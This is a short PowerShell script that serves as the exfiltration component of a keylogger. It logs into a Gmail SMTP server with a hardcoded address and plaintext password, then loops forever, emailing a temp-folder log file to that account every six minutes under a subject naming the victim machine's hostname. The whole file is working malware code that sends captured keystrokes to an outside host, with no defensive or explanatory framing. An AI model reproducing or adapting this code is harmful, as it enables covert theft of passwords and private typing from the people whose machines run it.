$SMTPServer = 'smtp.gmail.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('pruebapoloa@gmail.com', 'polopolo123')
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = 'pruebapoloa@gmail.com'
$ReportEmail.To.Add('pruebapoloa@gmail.com')
$ReportEmail.Subject = 'Keylogger - ' + [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
while(1){$ReportEmail.Attachments.Add("$ENV:temp\testing123.txt");$SMTPInfo.Send($ReportEmail); sleep 360}
